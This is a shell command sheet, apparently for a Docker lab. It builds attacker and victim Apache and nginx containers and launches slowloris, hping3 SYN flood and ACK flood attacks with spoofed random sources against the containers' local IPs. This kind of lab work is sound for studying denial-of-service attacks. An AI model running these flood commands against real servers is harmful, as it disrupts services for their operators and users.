#---------------------------------------------------------------------------#
#                              Build the containers                         # 
#---------------------------------------------------------------------------#

# Build the attacker image
docker build -t attacker attack-with-slowloris
# Build the victime-nginx image
docker build -t victime-apache-server victime-apache-server
# Build the victime-nginx image
docker build -t victime-nginx-server victime-nginx-server

#---------------------------------------------------------------------------#
#                              Run the containers                           # 
#---------------------------------------------------------------------------#

# Run the container for apache server
docker run -dti --rm --name apache-server victime-apache-server 
# Run the container for nginx server
docker run -dti --rm --name nginx-server  victime-nginx-server
# Run the attacker container 
docker run -dti --rm --name attacker-DDOS attacker

#---------------------------------------------------------------------------#
#                       Get containers ip addresses                         # 
#---------------------------------------------------------------------------#

docker network inspect bridge
# To acces the apache-server http://172.17.0.2 or the ip given by the inspect command
# To acces the nginx-server http://172.17.0.3 or the ip given by the inspect command
# attacker ip 172.17.0.4/16


#---------------------------------------------------------------------------#
#                               HTTP flood attack                           # 
#---------------------------------------------------------------------------#

# Launch the slowloris(slow HTTP GET attack) attack against the apache-server
docker exec -ti attacker-DDOS /bin/bash -c "slowloris 172.17.0.2 -s 1000"
# Launch the slowloris(slow HTTP GET attack) attack against the nginx-server
docker exec -ti attacker-DDOS /bin/bash -c "slowloris 172.17.0.3 -s 1000"

#---------------------------------------------------------------------------#
#                               SYN flood attack                            # 
#---------------------------------------------------------------------------#

# Launch the SYN flood attack against the apache-server
docker exec -ti attacker-DDOS /bin/bash -c "hping3 -S -c 100000 -d 1000 -p 80 --flood  --rand-source 172.17.0.2"
# Launch the SYN flood attack against the nginx-server
docker exec -ti attacker-DDOS /bin/bash -c "hping3 -S -c 100000 -d 1000 -p 80 --flood  --rand-source 172.17.0.3"

#---------------------------------------------------------------------------#
#                               ACK flood attack                            # 
#---------------------------------------------------------------------------#

# Launch the ACK flood attack against the apache-server
docker exec -ti attacker-DDOS /bin/bash -c "hping3 -A -c 100000 -d 1000 -p 80 --flood  --rand-source 172.17.0.2"
# Launch the ACK flood attack against the nginx-server
docker exec -ti attacker-DDOS /bin/bash -c "hping3 -A -c 100000 -d 1000 -p 80 --flood  --rand-source 172.17.0.3"



